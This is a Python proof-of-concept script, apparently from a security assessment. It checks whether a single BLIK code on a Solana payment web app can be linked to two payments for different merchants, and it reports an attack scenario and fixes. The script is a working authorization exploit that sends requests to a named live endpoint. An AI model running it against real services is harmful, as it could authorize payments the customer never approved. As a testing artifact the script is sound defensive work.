#!/usr/bin/env python3
"""
AUTHZ-VULN-07: Code Reuse Vulnerability Test
Tests if a single BLIK code can be linked to multiple payments
"""

import requests
import json
from datetime import datetime

BASE_URL = "https://solana-blik.vercel.app"

def print_step(step_num, title):
    """Print formatted step header"""
    print(f"\n{'='*70}")
    print(f"STEP {step_num}: {title}")
    print(f"{'='*70}")

def print_response(response):
    """Print formatted response"""
    print(f"Status Code: {response.status_code}")
    print(f"Response Body:")
    try:
        print(json.dumps(response.json(), indent=2))
    except:
        print(response.text)

def main():
    print(f"\n{'#'*70}")
    print(f"# AUTHZ-VULN-07: Code Reuse Vulnerability Test")
    print(f"# Testing if single code can be linked to multiple payments")
    print(f"# Timestamp: {datetime.now().isoformat()}")
    print(f"{'#'*70}\n")

    # Step 1: Create Payment A
    print_step(1, "Create Payment A (Merchant 1, Amount: 1.0 SOL)")
    payment_a_data = {
        "amount": 1.0,
        "merchantWallet": "11111111111111111111111111111111"
    }
    response_a = requests.post(
        f"{BASE_URL}/api/payments/create",
        json=payment_a_data,
        headers={"Content-Type": "application/json"}
    )
    print_response(response_a)

    if response_a.status_code != 200:
        print("\n❌ FAILED: Could not create Payment A")
        return

    payment_a_id = response_a.json().get("paymentId")
    print(f"\n✓ Payment A ID: {payment_a_id}")

    # Step 2: Create Payment B
    print_step(2, "Create Payment B (Merchant 2, Amount: 2.0 SOL)")
    payment_b_data = {
        "amount": 2.0,
        "merchantWallet": "22222222222222222222222222222222"
    }
    response_b = requests.post(
        f"{BASE_URL}/api/payments/create",
        json=payment_b_data,
        headers={"Content-Type": "application/json"}
    )
    print_response(response_b)

    if response_b.status_code != 200:
        print("\n❌ FAILED: Could not create Payment B")
        return

    payment_b_id = response_b.json().get("paymentId")
    print(f"\n✓ Payment B ID: {payment_b_id}")

    # Step 3: Generate a single code
    print_step(3, "Generate Single BLIK Code (Customer)")
    code_data = {
        "walletPubkey": "33333333333333333333333333333333"
    }
    response_code = requests.post(
        f"{BASE_URL}/api/codes/generate",
        json=code_data,
        headers={"Content-Type": "application/json"}
    )
    print_response(response_code)

    if response_code.status_code != 200:
        print("\n❌ FAILED: Could not generate code")
        return

    code = response_code.json().get("code")
    print(f"\n✓ Generated Code: {code}")

    # Step 4: Link code to Payment A
    print_step(4, "Link Code to Payment A (First Linking - Should Succeed)")
    link_a_data = {
        "paymentId": payment_a_id,
        "code": code
    }
    response_link_a = requests.post(
        f"{BASE_URL}/api/payments/link",
        json=link_a_data,
        headers={"Content-Type": "application/json"}
    )
    print_response(response_link_a)

    if response_link_a.status_code != 200:
        print("\n❌ FAILED: Could not link code to Payment A")
        return

    matched_a = response_link_a.json().get("matched")
    print(f"\n✓ First Link Status: matched={matched_a}")

    # Step 5: EXPLOIT - Try to link SAME code to Payment B
    print_step(5, "🔴 EXPLOIT: Try to Link SAME Code to Payment B")
    print(f"Attempting to reuse code: {code}")
    print(f"Target Payment B ID: {payment_b_id}")

    link_b_data = {
        "paymentId": payment_b_id,
        "code": code
    }
    response_link_b = requests.post(
        f"{BASE_URL}/api/payments/link",
        json=link_b_data,
        headers={"Content-Type": "application/json"}
    )
    print_response(response_link_b)

    # Analyze results
    print(f"\n{'='*70}")
    print("VULNERABILITY ANALYSIS")
    print(f"{'='*70}\n")

    if response_link_b.status_code == 200:
        matched_b = response_link_b.json().get("matched")

        if matched_b:
            print("🚨 VULNERABILITY CONFIRMED: AUTHZ-VULN-07")
            print("=" * 70)
            print("\nSEVERITY: HIGH")
            print("\nDESCRIPTION:")
            print("  A single BLIK code can be linked to multiple payment requests.")
            print("  This allows one customer approval to authorize payments to")
            print("  multiple different merchants.")
            print("\nEVIDENCE:")
            print(f"  - Payment A (1.0 SOL to Merchant 1): Linked successfully")
            print(f"  - Payment B (2.0 SOL to Merchant 2): ALSO linked successfully")
            print(f"  - Same code used: {code}")
            print("\nIMPACT:")
            print("  1. Customer approves ONE code")
            print("  2. Malicious actor links it to multiple payments")
            print("  3. Customer unknowingly pays multiple merchants")
            print(f"  4. Total exposure: 1.0 + 2.0 = 3.0 SOL from single approval")
            print("\nATTACK SCENARIO:")
            print("  1. Customer generates code for 1 SOL payment to Merchant A")
            print("  2. Attacker intercepts/observes the code")
            print("  3. Attacker creates payment request for 2 SOL to Merchant B")
            print("  4. Attacker links the SAME code to their payment")
            print("  5. Both payments execute with single customer approval")
            print("\nRECOMMENDATION:")
            print("  - Implement one-to-one code-to-payment constraint")
            print("  - Mark codes as 'used' after first successful link")
            print("  - Add database uniqueness constraint on code linking")
            print("  - Implement atomic code consumption with race condition protection")
        else:
            print("✅ SECURE: Code reuse prevented")
            print(f"  Step 5 returned matched=false")
    elif response_link_b.status_code == 400:
        print("✅ SECURE: Code reuse prevented")
        print(f"  Step 5 returned 400 error (code already used)")
    elif response_link_b.status_code == 404:
        print("✅ SECURE: Code reuse prevented")
        print(f"  Step 5 returned 404 error (code not found/consumed)")
    else:
        print(f"⚠️  UNEXPECTED: Step 5 returned status {response_link_b.status_code}")

    print("\n" + "="*70)

if __name__ == "__main__":
    main()
